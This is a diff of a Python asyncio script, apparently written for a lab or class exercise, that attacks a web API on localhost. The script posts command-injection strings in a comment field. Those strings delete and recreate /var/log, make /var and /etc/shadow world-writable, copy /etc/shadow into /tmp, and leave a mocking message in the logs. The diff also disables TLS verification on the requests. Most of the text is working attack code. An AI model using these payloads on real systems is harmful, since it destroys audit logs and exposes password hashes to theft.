@@ -12,11 +12,11 @@ async def get(url):
         raise e
 
 
-async def post(url, input):
-    data = {"commentaire": input}
+async def post(url, user_input):
+    data = {"commentaire": user_input}
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.post(url=url, data=data) as response:
+            async with session.post(url=url, json=data, ssl=False) as response:
                 resp = await response.read()
     except Exception as e:
         raise e
@@ -27,12 +27,14 @@ async def denial_of_service(port):
 
 
 async def destroy_logs(port):
-    await post('https://localhost:{}/api/values/'.format(port),
-         "\"; rm -rf /var/log; touch /var/log/message; echo \"Much lulz. J'ai delete tes logs\" >> /var/log/message #")
+    await asyncio.gather(post('https://localhost:{}/api/values/manette/xbox'.format(port),
+               "\"; chmod 777 /var -R; rm -rf /var/log; mkdir /var/log; > /var/log/message;"
+               " echo \"Much lulz. J'ai delete tes logs.\" >> /var/log/message #"))
 
 
 async def vandalize_website(port):
-    await post('https://localhost:{}/api/values/'.format(port), "\"; rm /tmp/xbox; cp /etc/shadow /tmp/xbox #")
+    await asyncio.gather(post('https://localhost:{}/api/values/manette/xbox'.format(port),
+               "\"; chmod 777 /etc/shadow; rm /tmp/xbox; cp /etc/shadow /tmp/xbox #"))
 
 
 if __name__ == '__main__':
